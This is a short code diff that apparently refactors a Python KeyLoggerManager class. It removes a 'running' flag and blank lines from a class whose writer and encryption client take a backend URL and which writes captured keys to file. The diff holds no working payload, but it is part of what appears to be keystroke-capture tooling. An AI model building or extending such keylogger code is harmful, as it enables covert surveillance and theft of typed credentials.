@@ -16,7 +16,6 @@ class KeyLoggerManager:
         self.file_writer = Writer(url)
         self.encryptor = EncryptionClient(url)
         self.interval = interval
-        self.running = self.service.is_listening
         self.backend_url = url
         self.start()
 
@@ -24,10 +23,7 @@ class KeyLoggerManager:
         self._schedule_next_write()
         self.service.start_logging()
 
-
-
     def stop(self):
-        self.running = False
         self.service.stop_logging()
         self._write_keys_to_file()
 
